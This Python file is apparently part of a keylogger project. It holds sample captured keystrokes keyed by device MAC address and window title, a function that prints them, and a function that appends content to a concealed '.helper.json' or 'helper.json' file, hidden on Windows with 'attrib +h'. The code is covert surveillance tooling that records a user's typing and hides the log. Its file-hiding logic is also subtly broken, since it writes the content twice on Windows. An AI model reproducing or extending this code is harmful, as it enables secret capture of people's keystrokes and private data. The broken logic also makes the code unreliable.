import platform
import os

#יצירת גייסון מסודר
def rewrite(data):
    for device, timestamps in data.items():
        print(device)
        for timestamp, programs in timestamps.items():
            print("\t",timestamp)
            for program, keys in programs.items():
                keys_str = "".join(keys)
                print("\t\t",program)
                print("\t\t\t",keys_str)


data = {
    "f8:54:f6:bc:2e:64": {
        "12/02/2025  16:04": {
            "Desktop – KeyLogger_Manager.py": ["k", "j", "k", "j", "k", "j", "d", "k", "w", "j", "k", "j", "k"],
            "כרטיסייה חדשה - Google Chrome": ["h", "k", "h"," ", "k", "d", "j", "k", "j", "k", "j", "d", "s", "j", "k", "j", "k", "s"],
            "Program Manager": ["shift", "Q"]
        }
    }
}

# rewrite(data)

def create_hidden_file(content=" "):
    system = platform.system()

    if system == "Darwin":
        os.chdir(os.path.expanduser("~/Documents"))
    with open(".helper.json", 'a') as file:
        file.write(content)

    if system == "Windows":
        user_name=os.getlogin()
        os.chdir(f"c:/users/{user_name}/Documents")
        with open("helper.json", 'a') as file:
            file.write(content)
        os.system('attrib +h "helper.json"')

# create_hidden_file("This is hidden content.")